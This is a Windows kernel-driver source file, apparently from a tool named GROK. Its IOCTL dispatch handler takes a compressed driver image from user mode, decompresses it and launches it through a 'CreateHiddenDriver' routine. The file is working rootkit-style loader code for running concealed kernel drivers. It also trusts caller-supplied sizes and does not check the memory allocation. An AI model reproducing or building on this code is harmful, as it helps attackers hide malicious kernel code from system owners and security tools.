#include "gCommon.hpp"


enum class GROK_IOCTL : ULONG
{
    SendCompressedBuffer = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_IN_DIRECT, FILE_READ_DATA)
};


///<summary>
///At present, only receives the compressed
///driver and launches GROK::CreateHiddenDriver
///</summary>
NTSTATUS GROK::DispatchHandler(
    PDEVICE_OBJECT,
    PIRP Irp
)
{
    auto status      = STATUS_INVALID_DEVICE_REQUEST;
    auto stack       = IoGetCurrentIrpStackLocation(Irp);
    auto controlCode = (GROK_IOCTL) stack->Parameters.DeviceIoControl.IoControlCode;
    
    switch (controlCode)
    {
        case GROK_IOCTL::SendCompressedBuffer:
        {
            if (Irp->AssociatedIrp.SystemBuffer)            
            {
                
                auto hiddenDriverInfo = (GROK::HIDDEN_DRIVER_INFO*) Irp->AssociatedIrp.SystemBuffer;
                if (stack->Parameters.DeviceIoControl.InputBufferLength != sizeof GROK::HIDDEN_DRIVER_INFO)
                {
                    break;
                }

                auto decompressedDriver = (PUCHAR) ExAllocatePoolWithTag(NonPagedPool, 
                                                                         hiddenDriverInfo->DriverSize,
                                                                         ALLOC_TAG);
                
                ULONG _ {};
                status = RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1,
                                             decompressedDriver,
                                             hiddenDriverInfo->DriverSize,
                                             hiddenDriverInfo->CompressedDriver,
                                             hiddenDriverInfo->FinalSize,
                                             &_);

                if (NT_SUCCESS(status))
                {
                    status = GROK::CreateHiddenDriver(false, decompressedDriver);
                }

            }
            
        } break;

        default:
            break;
    }

    return status;
}

